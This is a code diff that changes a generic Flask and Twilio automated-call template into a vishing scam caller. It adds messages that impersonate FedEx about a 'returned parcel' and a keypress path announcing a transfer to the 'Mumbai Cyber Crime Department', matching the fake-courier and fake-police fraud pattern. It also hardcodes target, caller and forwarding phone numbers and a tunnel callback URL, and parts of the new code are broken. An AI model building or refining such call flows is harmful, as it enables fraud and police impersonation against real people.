@@ -2,22 +2,25 @@ from flask import Flask, request
 from twilio.twiml.voice_response import VoiceResponse, Gather
 from twilio.rest import Client
 
-app = Flask(_name_)
+app = Flask(__name__)
 
-account_sid = 'YOUR_ACCOUNT_SID'
-auth_token = 'YOUR_AUTH_TOKEN'
+account_sid = ''
+auth_token = ''
 client = Client(account_sid, auth_token)
 
-predefined_message = 'Hello! This is an automated call. Please press 1 to connect to customer care. Press 0 to repeat the message.'
+initial_message = 'This is calling from Fedex international courier service. Your parcel has been returned. Please press 1 for more information.'
+
+hold_message = 'Fedex international courier service.'
+
+transfer_message = 'This call has been transferred to the Mumbai Cyber Crime Department.'
 
 @app.route('/make-call', methods=['POST'])
 def make_call():
-    to = request.form['to']
-    from_number = 'YOUR_TWILIO_NUMBER'  # Twilio number
-
+    to = '+919901993641'
+    from_number = '+19045724924'
     try:
         call = client.calls.create(
-            url='https://your-domain.com/voice-response',  # URL to handle call flow
+            url='https://a95b-27-7-5-16.ngrok-free.app/voice-response',
             to=to,
             from_=from_number
         )
@@ -26,17 +29,14 @@ def make_call():
     except Exception as e:
         print(f'Error: {e}')
         return {'message': 'Error making call', 'error': str(e)}, 500
-
+    
 @app.route('/voice-response', methods=['POST'])
 def voice_response():
     response = VoiceResponse()
-
-    # Gather input (keypress) with a 10-second timeout
     gather = Gather(num_digits=1, action='/gather-response', method='POST', timeout=10)
-    gather.say(predefined_message)
+    gather.say(initial_message)
     response.append(gather)
 
-    # If no input is received within the timeout, hang up the call
     response.say('No input received. Goodbye.')
     response.hangup()
 
@@ -48,17 +48,26 @@ def gather_response():
     response = VoiceResponse()
 
     if digits == '1':
-        # Forward the call to customer care
-        response.dial('+CUSTOMER_CARE_NUMBER')
-    elif digits == '0':
-        # Repeat the message by redirecting to the original route
-        response.redirect('/voice-response')
+        response.say(hold_message)
+        response.pause(length=5)  # Simulate a 5-second hold
+        response.dial('+919562152879')
+        gather = Gather(num_digits='0', action='/cont', method='POST', timeout=10)
+
     else:
-        # If an invalid key is pressed, say goodbye and hang up
+        # Invalid input, hang up
         response.say('Invalid input. Goodbye.')
         response.hangup()
 
     return str(response)
 
-if _name_ == '_main_':
+@app.route('/cont', methods=['POST'])
+def cont():
+    digits = request.form.get('Digits')
+    print('exec')
+    response = VoiceResponse()
+    if '##' in digits:
+        response.say(transfer_message)
+        response.dial('+919074896995')
+
+if __name__ == '__main__':
     app.run(port=3000)
